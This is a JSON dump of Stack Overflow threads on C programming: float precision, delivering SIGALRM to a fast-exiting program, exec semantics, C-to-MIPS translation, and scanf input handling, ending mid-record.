[{"tags": ["c", "debugging", "casting", "char"], "comments": [{"owner": {"reputation": 228853, "user_id": 827263, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/216c1db53d752f87dd8176a6ba0c2190?s=128&d=identicon&r=PG", "display_name": "Keith Thompson", "link": "https://stackoverflow.com/users/827263/keith-thompson"}, "edited": false, "score": 0, "creation_date": 1476315650, "post_id": 40010005, "comment_id": 67298075, "body": "Floating-point values are stored in binary. The values <code>3.9</code> and <code>108.9</code> cannot be represented exactly. The actual value is most likely <code>108.90000152587890625</code>."}], "answers": [{"tags": [], "owner": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "is_accepted": false, "score": 3, "last_activity_date": 1476315659, "creation_date": 1476315659, "answer_id": 40010050, "question_id": 40010005, "link": "https://stackoverflow.com/questions/40010005/c-convert-char-to-float-produce-0-000002/40010050#40010050", "title": "C : Convert Char To Float Produce 0.000002?", "body": "<p><code>char c = 'a'</code> assigns the value <code>97</code> to <code>c</code>. <code>97 + 8 + 3.9</code> is <code>108.9</code> in real numbers, but it does not have an exact representation as a float. That's where the spurious <code>0.000002</code> comes from. As Keith Thompson points out, the actual value is likely to be <code>108.90000152587890625</code>, but the <code>%f</code> format specifier probably rounds it.</p>\n\n<p>This is due to the fact that there can only be a finite number of floating point numbers whereas there are uncountably many real numbers.</p>\n"}, {"tags": [], "owner": {"reputation": 196207, "user_id": 434551, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/8Wzl8.png?s=128&g=1", "display_name": "R Sahu", "link": "https://stackoverflow.com/users/434551/r-sahu"}, "is_accepted": false, "score": 2, "last_activity_date": 1476316136, "creation_date": 1476316136, "answer_id": 40010120, "question_id": 40010005, "link": "https://stackoverflow.com/questions/40010005/c-convert-char-to-float-produce-0-000002/40010120#40010120", "title": "C : Convert Char To Float Produce 0.000002?", "body": "<p>Neither 11.9 nor 108.9 can be represented exactly in a <code>float</code>. You will get better accuracy if you use <code>double</code>.</p>\n\n<p>If you change the precision of printing, you will see how accurately those are represented.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main()\n{\n   int a = 8; float b = 3.9; char c='a';\n   float hasil = a+b;\n   printf(\"%.16f\\n\", hasil);\n   hasil = a+b+c;\n   printf(\"%.16f\\n\", hasil);\n   return 0;\n}\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>11.8999996185302734\n108.9000015258789062\n</code></pre>\n\n<p>By changing the type to <code>double</code>, I get more accurate output:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main()\n{\n   int a = 8; double b = 3.9; char c='a';\n   double hasil = a+b;\n   printf(\"%.16f\\n\", hasil);\n   hasil = a+b+c;\n   printf(\"%.16f\\n\", hasil);\n   return 0;\n}\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>11.9000000000000004\n108.9000000000000057\n</code></pre>\n\n<p>Those results are from gcc running on a Linux desktop. I suspect you will get similar, if not exactly same, results in other common compilers too.</p>\n"}], "owner": {"reputation": 18, "user_id": 6192797, "user_type": "registered", "profile_image": "https://graph.facebook.com/132159453850612/picture?type=large", "display_name": "Frank Saputra", "link": "https://stackoverflow.com/users/6192797/frank-saputra"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 89, "favorite_count": 0, "closed_date": 1476321408, "answer_count": 2, "score": -4, "last_activity_date": 1476316136, "creation_date": 1476315283, "last_edit_date": 1476315329, "question_id": 40010005, "link": "https://stackoverflow.com/questions/40010005/c-convert-char-to-float-produce-0-000002", "closed_reason": "Duplicate", "title": "C : Convert Char To Float Produce 0.000002?", "body": "<pre><code>#include &lt;stdio.h&gt;\n#include &lt;conio.h&gt;\nint main()\n{\nint a = 8; float b = 3.9; char c='a';\nfloat hasil = a+b+c;\nprintf(\"%f\", hasil);\ngetch();\nreturn 0;\n}\n</code></pre>\n\n<p>I Get result\n108.900002</p>\n\n<p>then, where 0.000002 is it?</p>\n\n<p>If I change to</p>\n\n<pre><code>float hasil = a+b;\n</code></pre>\n\n<p>then the result will be\n11.900000</p>\n\n<p>Then if we convert char so float, then it will definitely add value 0.000002?\nIs that true ? If yes why?</p>\n\n<p>Thanks you</p>\n"}, {"tags": ["c", "shell", "unix"], "comments": [{"owner": {"reputation": 32193, "user_id": 2908724, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/1xBJR.png?s=128&g=1", "display_name": "bishop", "link": "https://stackoverflow.com/users/2908724/bishop"}, "edited": false, "score": 0, "creation_date": 1476315652, "post_id": 40009985, "comment_id": 67298080, "body": "Perhaps <code>.&#47;prime 5; kill -14 $?</code>"}, {"owner": {"reputation": 222, "user_id": 6713792, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/e4197a56d186f6971d13308724f77ede?s=128&d=identicon&r=PG&f=1", "display_name": "hax", "link": "https://stackoverflow.com/users/6713792/hax"}, "reply_to_user": {"reputation": 32193, "user_id": 2908724, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/1xBJR.png?s=128&g=1", "display_name": "bishop", "link": "https://stackoverflow.com/users/2908724/bishop"}, "edited": false, "score": 0, "creation_date": 1476316074, "post_id": 40009985, "comment_id": 67298225, "body": "@bishop It won&#39;t work as with semicolon, the commands would be executed sequentially"}, {"owner": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "edited": false, "score": 1, "creation_date": 1476316796, "post_id": 40009985, "comment_id": 67298421, "body": "Try <code>.&#47;prime 5 &amp; kill -14 $!</code>"}, {"owner": {"reputation": 32193, "user_id": 2908724, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/1xBJR.png?s=128&g=1", "display_name": "bishop", "link": "https://stackoverflow.com/users/2908724/bishop"}, "edited": false, "score": 0, "creation_date": 1476316812, "post_id": 40009985, "comment_id": 67298423, "body": "Right, one of a couple of typos. Try again: <code>.&#47;prime 5 &amp; kill -14 $!</code>"}, {"owner": {"reputation": 6882, "user_id": 3403834, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/xpA5S.jpg?s=128&g=1", "display_name": "user58697", "link": "https://stackoverflow.com/users/3403834/user58697"}, "edited": false, "score": 0, "creation_date": 1476316930, "post_id": 40009985, "comment_id": 67298460, "body": "Impossible with the command line. You mentioned you can&#39;t run gdb on a target machine. Can you compile and run your code there?"}, {"owner": {"reputation": 222, "user_id": 6713792, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/e4197a56d186f6971d13308724f77ede?s=128&d=identicon&r=PG&f=1", "display_name": "hax", "link": "https://stackoverflow.com/users/6713792/hax"}, "reply_to_user": {"reputation": 32193, "user_id": 2908724, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/1xBJR.png?s=128&g=1", "display_name": "bishop", "link": "https://stackoverflow.com/users/2908724/bishop"}, "edited": false, "score": 0, "creation_date": 1476317261, "post_id": 40009985, "comment_id": 67298557, "body": "@bishop It is giving me a couple of PIDs. Which I am not sure of what process. The program did not enter the prime number finding loop, however it didn&#39;t recieve the interrupt signal either [ or the warning it should have fired to std out is not visible]"}, {"owner": {"reputation": 222, "user_id": 6713792, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/e4197a56d186f6971d13308724f77ede?s=128&d=identicon&r=PG&f=1", "display_name": "hax", "link": "https://stackoverflow.com/users/6713792/hax"}, "reply_to_user": {"reputation": 6882, "user_id": 3403834, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/xpA5S.jpg?s=128&g=1", "display_name": "user58697", "link": "https://stackoverflow.com/users/3403834/user58697"}, "edited": false, "score": 0, "creation_date": 1476317324, "post_id": 40009985, "comment_id": 67298577, "body": "@user58697 Yes I can, but I am supposed to use a defined binary which has a particular gid set."}, {"owner": {"reputation": 32193, "user_id": 2908724, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/1xBJR.png?s=128&g=1", "display_name": "bishop", "link": "https://stackoverflow.com/users/2908724/bishop"}, "edited": false, "score": 0, "creation_date": 1476317583, "post_id": 40009985, "comment_id": 67298633, "body": "Perhaps the signal was sent before the sighandlers were registered. There is a both a no-earlier-than limit and a no-later-than limit. You may be better off with a design change: command line option, read from stdin, etc."}, {"owner": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "edited": false, "score": 0, "creation_date": 1476321594, "post_id": 40009985, "comment_id": 67299549, "body": "You could also call <code>raise(SIGALRM);</code> somewhere in the program. Then you get to control precisely when the signal happens."}], "answers": [{"comments": [{"owner": {"reputation": 222, "user_id": 6713792, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/e4197a56d186f6971d13308724f77ede?s=128&d=identicon&r=PG&f=1", "display_name": "hax", "link": "https://stackoverflow.com/users/6713792/hax"}, "edited": false, "score": 0, "creation_date": 1476315653, "post_id": 40010007, "comment_id": 67298081, "body": "Yes you are right. Quite unusual for a normal program. But this is a purposeful piece of code for a challenge. Now to the point, the binary is on a different machine, on which I don&#39;t have much privilege or gdb. That&#39;s why I am looking for a single line shell command for the purpose."}, {"owner": {"reputation": 8784, "user_id": 2728148, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/GXsMO.png?s=128&g=1", "display_name": "Cort Ammon", "link": "https://stackoverflow.com/users/2728148/cort-ammon"}, "reply_to_user": {"reputation": 222, "user_id": 6713792, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/e4197a56d186f6971d13308724f77ede?s=128&d=identicon&r=PG&f=1", "display_name": "hax", "link": "https://stackoverflow.com/users/6713792/hax"}, "edited": false, "score": 1, "creation_date": 1476315841, "post_id": 40010007, "comment_id": 67298146, "body": "What makes you believe that doing it in a single line will manage to send the signal fast enough?  If you&#39;re fast enough, you many not even task-switch back to the shell to process the next command before <code>prime</code> terminates.  The Linux scheduler typically operates on scales of milliseconds, not microseconds."}, {"owner": {"reputation": 222, "user_id": 6713792, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/e4197a56d186f6971d13308724f77ede?s=128&d=identicon&r=PG&f=1", "display_name": "hax", "link": "https://stackoverflow.com/users/6713792/hax"}, "edited": false, "score": 0, "creation_date": 1476316451, "post_id": 40010007, "comment_id": 67298326, "body": "Apologies if I weren&#39;t clear. I didn&#39;t just mean that I am looking for a single line command. I am looking for a way to pass <b>SIGALRM</b> to a process, right when it starts where I just have the process name. So the challenge here for me is in identifying the <i>process ID</i> which I have to supply with <i>kill -14</i> . I tried <i>pidof</i> but the problem is I again need the pid of the process at that point of time while I am passing the kill. I assume that now it may be clear that why I am looking for a way to pass it in a single command."}, {"owner": {"reputation": 8784, "user_id": 2728148, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/GXsMO.png?s=128&g=1", "display_name": "Cort Ammon", "link": "https://stackoverflow.com/users/2728148/cort-ammon"}, "reply_to_user": {"reputation": 222, "user_id": 6713792, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/e4197a56d186f6971d13308724f77ede?s=128&d=identicon&r=PG&f=1", "display_name": "hax", "link": "https://stackoverflow.com/users/6713792/hax"}, "edited": false, "score": 0, "creation_date": 1476317671, "post_id": 40010007, "comment_id": 67298650, "body": "<a href=\"http://serverfault.com/questions/293632/how-do-i-start-a-process-in-suspended-state-under-linux\" title=\"how do i start a process in suspended state under linux\">serverfault.com/questions/293632/&hellip;</a> may be as close as you&#39;ll get.  The answers generally suspend the bash shell before starting your code, so you get the PID of your shell ahead of time and it works.  However, you&#39;re still at the mercy of the scheduler."}], "tags": [], "owner": {"reputation": 8784, "user_id": 2728148, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/GXsMO.png?s=128&g=1", "display_name": "Cort Ammon", "link": "https://stackoverflow.com/users/2728148/cort-ammon"}, "is_accepted": false, "score": 0, "last_activity_date": 1476315297, "creation_date": 1476315297, "answer_id": 40010007, "question_id": 40009985, "link": "https://stackoverflow.com/questions/40009985/how-to-pass-sigalrm-to-a-program-which-completes-execution-within-microseconds/40010007#40010007", "title": "How to pass SIGALRM to a program which completes execution within microseconds?", "body": "<p>Quite the unusual purpose for a signal!</p>\n\n<p>The easiest way I can see to do it is to run <code>prime</code> in gdb, and use its <code>signal</code> function to send the signal to your program.</p>\n"}, {"comments": [{"owner": {"reputation": 222, "user_id": 6713792, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/e4197a56d186f6971d13308724f77ede?s=128&d=identicon&r=PG&f=1", "display_name": "hax", "link": "https://stackoverflow.com/users/6713792/hax"}, "edited": false, "score": 0, "creation_date": 1476322062, "post_id": 40010814, "comment_id": 67299639, "body": "Not applicable here as I am supposed to manipulate the executable, rather than modifying the code and creating an alternate one."}], "tags": [], "owner": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "is_accepted": false, "score": -1, "last_activity_date": 1476321701, "creation_date": 1476321701, "answer_id": 40010814, "question_id": 40009985, "link": "https://stackoverflow.com/questions/40009985/how-to-pass-sigalrm-to-a-program-which-completes-execution-within-microseconds/40010814#40010814", "title": "How to pass SIGALRM to a program which completes execution within microseconds?", "body": "<p>Possibly the easiest way to make sure <code>SIGALRM</code> gets raised at a particular time is to add:</p>\n\n<pre><code>raise(SIGALRM);\n</code></pre>\n\n<p>at a particular point in the program. Then <code>SIGALRM</code> will always be raised when that call executes.</p>\n"}, {"tags": [], "owner": {"reputation": 170455, "user_id": 149341, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/omfTQ.png?s=128&g=1", "display_name": "duskwuff -inactive-", "link": "https://stackoverflow.com/users/149341/duskwuff-inactive"}, "is_accepted": false, "score": 1, "last_activity_date": 1476322856, "creation_date": 1476322856, "answer_id": 40010948, "question_id": 40009985, "link": "https://stackoverflow.com/questions/40009985/how-to-pass-sigalrm-to-a-program-which-completes-execution-within-microseconds/40010948#40010948", "title": "How to pass SIGALRM to a program which completes execution within microseconds?", "body": "<p>Make <code>prime</code> block on a write to a full pipe.</p>\n\n<p>To make this work, you need to know exactly what the capacity of a pipe on your system is. On most systems, this is 64 KB -- 65536 bytes. Some obscure UNIX systems (not Linux, and not Mac OS X) may have a different pipe capacity, so if this doesn't work you may want to check this.</p>\n\n<pre><code>( dd if=/dev/zero bs=65536 count=1 ; ./prime ) | ( sleep 3; cat )\nsleep 1\nkillall -ALRM prime\n</code></pre>\n\n<p>The first command constructs a pipe which performs the following actions on the writing end:</p>\n\n<ul>\n<li>Write 65536 null bytes to the pipe, filling it up.</li>\n<li>Start <code>prime</code>.</li>\n</ul>\n\n<p>and on the reading end:</p>\n\n<ul>\n<li><code>sleep</code> for 3 seconds.</li>\n<li>Have <code>cat</code> read everything out of the pipe and print it until it reaches EOF.</li>\n</ul>\n\n<p>When <code>prime</code> starts, the pipe is full of 64KB of null bytes, and the process on the other end is <code>sleep 3</code>, which isn't reading from the pipe. As soon as it starts trying to <code>write()</code> its first line of output, it blocks. While this is happening, the <code>sleep 1</code> will finish, and an alarm signal is delivered to <code>prime</code>, which is conveniently blocked. This makes it do\u2026 whatever it does when it gets SIGALRM.</p>\n\n<p>Once the <code>sleep 3</code> finishes, <code>cat</code> helpfully reads everything out of the pipe and prints it.</p>\n"}], "owner": {"reputation": 222, "user_id": 6713792, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/e4197a56d186f6971d13308724f77ede?s=128&d=identicon&r=PG&f=1", "display_name": "hax", "link": "https://stackoverflow.com/users/6713792/hax"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 339, "favorite_count": 0, "answer_count": 3, "score": 1, "last_activity_date": 1476322856, "creation_date": 1476315126, "question_id": 40009985, "link": "https://stackoverflow.com/questions/40009985/how-to-pass-sigalrm-to-a-program-which-completes-execution-within-microseconds", "title": "How to pass SIGALRM to a program which completes execution within microseconds?", "body": "<p>I have a C program which computes the first n prime numbers if n is passed as an argument. </p>\n\n<pre><code>$ ./prime 5\n2\n3\n5\n7\n11\n</code></pre>\n\n<p>The logic of the program allows me to enter into a desired function if I can give <code>SIGALRM</code> to the process of the program. </p>\n\n<p>So basically I have to enter </p>\n\n<pre><code>kill -14 &lt;PID of prime&gt;\n</code></pre>\n\n<p>in another terminal when 'prime' just starts executing, before entering the loop to find prime numbers. It is also to be noted that the PID changes every time the program is executed. </p>\n\n<p>How can I concatenate all these actions and perform this in a single line command?</p>\n"}, {"tags": ["c", "linux", "bash", "shell", "exec"], "comments": [{"owner": {"reputation": 95060, "user_id": 89817, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/df253c3b6533949ea94f31f328f3e769?s=128&d=identicon&r=PG", "display_name": "Gordon Davisson", "link": "https://stackoverflow.com/users/89817/gordon-davisson"}, "edited": false, "score": 1, "creation_date": 1476316534, "post_id": 40009873, "comment_id": 67298347, "body": "That&#39;s what <code>exec</code> (and its variants) do; see <a href=\"http://stackoverflow.com/questions/4204915/please-explain-exec-function-and-its-family\">this previous question</a> (and especially the discussion about using it together with <code>fork</code>)."}, {"owner": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "edited": false, "score": 0, "creation_date": 1476321323, "post_id": 40009873, "comment_id": 67299483, "body": "Yup, that&#39;s what exec does. Did you read the documentation?"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1476327654, "post_id": 40009873, "comment_id": 67301054, "body": "Note that if you gave a non-existent program name so the <code>exec</code> fails, your code would loop."}], "answers": [{"tags": [], "owner": {"reputation": 3265, "user_id": 2606938, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/7gIUB.jpg?s=128&g=1", "display_name": "Prabhu", "link": "https://stackoverflow.com/users/2606938/prabhu"}, "is_accepted": false, "score": 1, "last_activity_date": 1476316816, "creation_date": 1476316816, "answer_id": 40010207, "question_id": 40009873, "link": "https://stackoverflow.com/questions/40009873/after-using-the-exec-system-call-it-executes-the-other-program-but-exits-from-t/40010207#40010207", "title": "After using the exec system call, it executes the other program but exits from the current proram", "body": "<p>With exec family to run programs, once the specified program file starts its execution, the original program in the caller's address space is gone and is replaced by the new program. Thus there is no \"return\". In case of error condition , calling programs gets a negative return with errno set.</p>\n\n<p>You can fork and have the child process do the <code>execvp</code> and the parent call <code>goto</code></p>\n"}], "owner": {"reputation": 116, "user_id": 4624607, "user_type": "registered", "accept_rate": 50, "profile_image": "https://lh6.googleusercontent.com/-w_MgLZkHzvI/AAAAAAAAAAI/AAAAAAAAAcc/rb5VLIMDXIw/photo.jpg?sz=128", "display_name": "Viren Patel", "link": "https://stackoverflow.com/users/4624607/viren-patel"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 69, "favorite_count": 0, "closed_date": 1476327591, "answer_count": 1, "score": 0, "last_activity_date": 1476327545, "creation_date": 1476314376, "last_edit_date": 1476327545, "question_id": 40009873, "link": "https://stackoverflow.com/questions/40009873/after-using-the-exec-system-call-it-executes-the-other-program-but-exits-from-t", "closed_reason": "Duplicate", "title": "After using the exec system call, it executes the other program but exits from the current proram", "body": "<p>I want to use a goto statement in my code after the <code>exec</code> system call. but it exits from the program after using <code>exec</code>. How can it stay in my code?</p>\n\n<p>Here is the code. </p>\n\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;stdlib.h&gt;\n#include&lt;unistd.h&gt;\n#include&lt;string.h&gt;\n\n#define MAX_LINE 80\n#define MAX 3\n\nvoid main()\n{\n    char *args[MAX_LINE];\n    char arg1[MAX_LINE/2]=\"\\0\";\n    char arg2[MAX_LINE/2]=\"\\0\";\n\nUBOS: \n    printf(\"ubos&gt;\");\n    fflush(stdout);\n    fgets(arg1, sizeof(arg1), stdin);\n    arg1[strlen(arg1)-1]='\\0';\n    fgets(arg2, sizeof(arg2), stdin);\n    arg2[strlen(arg2)-1]='\\0';\n    printf(\"You typed: %s %s\\n\",arg1,arg2);\n    fflush(stdin);\n    if (strlen(arg2) == '\\0')\n    {\n         args[0] = arg1;\n         args[1] = '\\0';\n    } \n    else \n    {\n        args[0] = arg1;\n            args[1] = arg2;\n            args[2] = 0;\n    }\n    int i;\n    for(i=0;i&lt;MAX &amp;&amp; args[i];i++)\n    {\n            printf(\"Vlue of args[%d] =%s\\n\",i, args[i]);\n    }\n\n    execvp(args[0],args);\n    goto UBOS;\n\n\n    printf(\"Something is not correct...\\n\");\n    exit(0);\n}\n</code></pre>\n\n<p>I there any way I can make this code work?</p>\n"}, {"tags": ["c", "mips"], "comments": [{"owner": {"reputation": 2506, "user_id": 3528438, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/27f8b3bc74bea842104821678137cdb2?s=128&d=identicon&r=PG&f=1", "display_name": "user3528438", "link": "https://stackoverflow.com/users/3528438/user3528438"}, "edited": false, "score": 1, "creation_date": 1476316481, "post_id": 40009819, "comment_id": 67298336, "body": "you can use a compiler"}, {"owner": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "reply_to_user": {"reputation": 2506, "user_id": 3528438, "user_type": "registered", "accept_rate": 68, "profile_image": "https://www.gravatar.com/avatar/27f8b3bc74bea842104821678137cdb2?s=128&d=identicon&r=PG&f=1", "display_name": "user3528438", "link": "https://stackoverflow.com/users/3528438/user3528438"}, "edited": false, "score": 0, "creation_date": 1476321449, "post_id": 40009819, "comment_id": 67299512, "body": "@user3528438 Manually compiling C is a common exercise when learning assembly."}, {"owner": {"reputation": 51929, "user_id": 1524450, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/BSzDV.png?s=128&g=1", "display_name": "Michael", "link": "https://stackoverflow.com/users/1524450/michael"}, "edited": false, "score": 1, "creation_date": 1476348861, "post_id": 40009819, "comment_id": 67309959, "body": "What were you expecting to happen after <code>get_singleton</code> returns?  (hint: what is the very next instruction after <code>jal get_singleton</code>?)"}, {"owner": {"reputation": 1, "user_id": 6519142, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/275bbd8c99e9c16f9a4396200a748c80?s=128&d=identicon&r=PG&f=1", "display_name": "JakeyJ", "link": "https://stackoverflow.com/users/6519142/jakeyj"}, "edited": false, "score": 0, "creation_date": 1476377747, "post_id": 40009819, "comment_id": 67330941, "body": "Its suppose to return the index of the first occurrence of a set bit in the number specified in the main function. Only if the number is a singleton meaning it only has one set bit will it return the index."}], "owner": {"reputation": 1, "user_id": 6519142, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/275bbd8c99e9c16f9a4396200a748c80?s=128&d=identicon&r=PG&f=1", "display_name": "JakeyJ", "link": "https://stackoverflow.com/users/6519142/jakeyj"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 89, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1476313926, "creation_date": 1476313926, "question_id": 40009819, "link": "https://stackoverflow.com/questions/40009819/how-do-i-translate-this-code-from-c-to-mips", "title": "How do I translate this code from C to MIPS?", "body": "<p>This is the the original code we are given.  We need to translate the following C code into MIPS. </p>\n\n<pre><code>## int get_singleton(int value) {\n##   for (int i = 0 ; i &lt; GRID_SQUARED ; ++ i) {\n##   if (value == (1&lt;&lt;i)) {\n##      return i;\n##   }\n##   }\n##   return 0;\n## }\nget_singleton:\n    jr  $ra\n</code></pre>\n\n<p>So far I have this for my translation but I keep getting stuck in an infinite loop.</p>\n\n<pre><code>main:\n    li  $a0, 0x010\n    jal get_singleton\n\nget_singleton:\n    li  $v0, 0          # i\n    li  $t1, 1\ngs_loop:sll $t2, $t1, $v0       # (1&lt;&lt;i)\n    beq $t2, $a0, get_singleton_done\n    add $v0, $v0, 1\n    blt $v0, 9, gs_loop     # repeat if (i &lt; 9)\nget_singleton_done:\n    jr  $ra\n</code></pre>\n"}, {"tags": ["c", "scanf"], "comments": [{"owner": {"reputation": 48201, "user_id": 1250772, "user_type": "registered", "accept_rate": 45, "profile_image": "https://www.gravatar.com/avatar/633e1f643d2c9b043231b4a32b078907?s=128&d=identicon&r=PG", "display_name": "Kaz", "link": "https://stackoverflow.com/users/1250772/kaz"}, "edited": false, "score": 5, "creation_date": 1476313151, "post_id": 40009690, "comment_id": 67297454, "body": "If the format is line oriented, you will thank yourself later if you read the lines using <code>fgets</code> into a buffer, and then extract data from the buffer using <code>sscanf</code>.  You can keep an accurate line count and give a diagnostic pinpointing the line number if something is wrong (like scanf not being able to extract an integer)."}, {"owner": {"reputation": 165665, "user_id": 721269, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/346ca03edfbde2a468adc289867ab975?s=128&d=identicon&r=PG", "display_name": "David Schwartz", "link": "https://stackoverflow.com/users/721269/david-schwartz"}, "edited": false, "score": 0, "creation_date": 1476313157, "post_id": 40009690, "comment_id": 67297456, "body": "If you want to read in a line and parse it, why not start with a function that reads in a line?"}, {"owner": {"reputation": 48201, "user_id": 1250772, "user_type": "registered", "accept_rate": 45, "profile_image": "https://www.gravatar.com/avatar/633e1f643d2c9b043231b4a32b078907?s=128&d=identicon&r=PG", "display_name": "Kaz", "link": "https://stackoverflow.com/users/1250772/kaz"}, "reply_to_user": {"reputation": 165665, "user_id": 721269, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/346ca03edfbde2a468adc289867ab975?s=128&d=identicon&r=PG", "display_name": "David Schwartz", "link": "https://stackoverflow.com/users/721269/david-schwartz"}, "edited": false, "score": 0, "creation_date": 1476313178, "post_id": 40009690, "comment_id": 67297466, "body": "@DavidSchwartz :)"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 1, "creation_date": 1476314429, "post_id": 40009690, "comment_id": 67297776, "body": "Detail: <code>scanf()</code> does not read C <i>strings</i>.  It reads <code>stdin</code> where the rare null character on input has no special meaning.  The usual thought of string with<code>scanf()</code> is reading until <code>&#39;\\n&#39;</code>. <code>sscanf()</code> reads a <i>string</i>.  So do you want to know about reading characters with <code>scanf()</code> or a <i>string</i> with <code>sscanf()</code>?  A robust answer has subtle differences depending on your selection.  All in all , your <i>best</i> approach is to abandon this goal and follow this <a href=\"http://stackoverflow.com/questions/40009690/c-how-to-skip-rest-of-the-string-using-scanf#comment67297454_40009690\">@Kaz comment</a>"}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1476315029, "post_id": 40009690, "comment_id": 67297912, "body": "... and easily dump the unused part of the line, as question title."}, {"owner": {"reputation": 1905, "user_id": 2094844, "user_type": "registered", "accept_rate": 54, "profile_image": "https://i.stack.imgur.com/NE8It.jpg?s=128&g=1", "display_name": "Sagar", "link": "https://stackoverflow.com/users/2094844/sagar"}, "reply_to_user": {"reputation": 48201, "user_id": 1250772, "user_type": "registered", "accept_rate": 45, "profile_image": "https://www.gravatar.com/avatar/633e1f643d2c9b043231b4a32b078907?s=128&d=identicon&r=PG", "display_name": "Kaz", "link": "https://stackoverflow.com/users/1250772/kaz"}, "edited": false, "score": 0, "creation_date": 1476316269, "post_id": 40009690, "comment_id": 67298278, "body": "@Kaz thanks, done with <code>fgets</code> and <code>sscanf</code>."}, {"owner": {"reputation": 48201, "user_id": 1250772, "user_type": "registered", "accept_rate": 45, "profile_image": "https://www.gravatar.com/avatar/633e1f643d2c9b043231b4a32b078907?s=128&d=identicon&r=PG", "display_name": "Kaz", "link": "https://stackoverflow.com/users/1250772/kaz"}, "edited": false, "score": 0, "creation_date": 1476328159, "post_id": 40009690, "comment_id": 67301162, "body": "Be sure to check the return value of <code>sscanf</code>; it&#39;s informative. Also, watch out for out of range values. Conversion like <code>%d</code> invokes <b>undefined behavior</b> if the input is out of range. IIRC, the only way to work around that in the <code>scanf</code> functions is by limiting the field width."}], "owner": {"reputation": 